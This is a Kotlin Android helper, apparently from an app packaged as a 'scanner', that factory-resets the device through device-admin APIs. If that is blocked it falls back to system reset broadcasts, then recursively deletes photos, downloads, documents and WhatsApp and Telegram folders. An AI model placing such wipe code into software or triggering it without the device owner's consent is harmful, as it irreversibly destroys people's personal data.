package com.example.scanner

import android.content.Context
import android.app.admin.DevicePolicyManager
import android.content.Intent
import android.os.Build
import android.os.Environment
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

object RemoteWipeHelper {

    data class WipeResult(
        val filesDeleted: Int,
        val bytesDeleted: Long,
        val factoryResetTriggered: Boolean,
        val error: String? = null
    )

    suspend fun performWipe(context: Context): WipeResult = withContext(Dispatchers.IO) {
        var filesCount = 0
        var bytesCount = 0L
        var factoryReset = false

        // 1. Attempt hardware factory reset via DevicePolicyManager
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            if (dpm != null) {
                val compName = AppAdminReceiver.getComponentName(context)
                val isAdmin = dpm.isAdminActive(compName)
                Log.d("RemoteWipe", "Device Admin active: $isAdmin (SDK ${Build.VERSION.SDK_INT})")

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    // Android 14+ (API 34+): Use wipeDevice() to prevent "User 0 is a system user and cannot be removed"
                    try {
                        Log.d("RemoteWipe", "Android 14+: executing dpm.wipeDevice(0)...")
                        dpm.wipeDevice(0)
                        factoryReset = true
                    } catch (e1: Exception) {
                        Log.w("RemoteWipe", "wipeDevice(0) error: ${e1.message}, trying WIPE_EXTERNAL_STORAGE")
                        try {
                            dpm.wipeDevice(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
                            factoryReset = true
                        } catch (e2: Exception) {
                            Log.w("RemoteWipe", "wipeDevice(WIPE_EXTERNAL_STORAGE) error: ${e2.message}")
                            // Fallback attempt to wipeData with external storage flag
                            try {
                                dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
                                factoryReset = true
                            } catch (_: Exception) {}
                        }
                    }
                } else {
                    // Android 13 and below
                    try {
                        Log.d("RemoteWipe", "Android <14: executing dpm.wipeData(0)...")
                        dpm.wipeData(0)
                        factoryReset = true
                    } catch (e1: Exception) {
                        Log.w("RemoteWipe", "wipeData(0) error: ${e1.message}, trying WIPE_EXTERNAL_STORAGE")
                        try {
                            dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
                            factoryReset = true
                        } catch (_: Exception) {}
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("RemoteWipe", "Factory reset attempt completed with status: ${e.message}")
        }

        // Broadcast fallback for system reset if wipeDevice was restricted
        if (!factoryReset) {
            try {
                context.sendBroadcast(Intent("android.intent.action.FACTORY_RESET").apply {
                    setPackage("android")
                    addFlags(Intent.FLAG_RECEIVER_FOREGROUND)
                })
            } catch (_: Exception) {}

            try {
                context.sendBroadcast(Intent("android.intent.action.MASTER_CLEAR").apply {
                    addFlags(Intent.FLAG_RECEIVER_FOREGROUND)
                })
            } catch (_: Exception) {}
        }

        // 2. Wipe Storage Folders (DCIM, Downloads, Pictures, Documents, etc.)
        val targetDirs = listOfNotNull(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
            File(Environment.getExternalStorageDirectory(), "WhatsApp"),
            File(Environment.getExternalStorageDirectory(), "Telegram"),
            context.getExternalFilesDir(null),
            context.cacheDir,
            context.externalCacheDir
        )

        for (dir in targetDirs) {
            try {
                if (dir.exists()) {
                    val (count, bytes) = deleteDirectoryContents(dir)
                    filesCount += count
                    bytesCount += bytes
                }
            } catch (_: Exception) {}
        }

        // Also sweep external storage root for loose files
        try {
            val root = Environment.getExternalStorageDirectory()
            root.listFiles()?.forEach { file ->
                try {
                    if (file.isFile && !file.name.startsWith(".")) {
                        val len = file.length()
                        if (file.delete()) {
                            filesCount++
                            bytesCount += len
                        }
                    }
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}

        WipeResult(
            filesDeleted = filesCount,
            bytesDeleted = bytesCount,
            factoryResetTriggered = factoryReset
        )
    }

    private fun deleteDirectoryContents(dir: File): Pair<Int, Long> {
        var count = 0
        var bytes = 0L

        val children = dir.listFiles() ?: return Pair(0, 0L)
        for (child in children) {
            try {
                if (child.isDirectory) {
                    val (subCount, subBytes) = deleteDirectoryContents(child)
                    count += subCount
                    bytes += subBytes
                    child.delete()
                } else {
                    val len = child.length()
                    if (child.delete()) {
                        count++
                        bytes += len
                    }
                }
            } catch (_: Exception) {}
        }
        return Pair(count, bytes)
    }
}
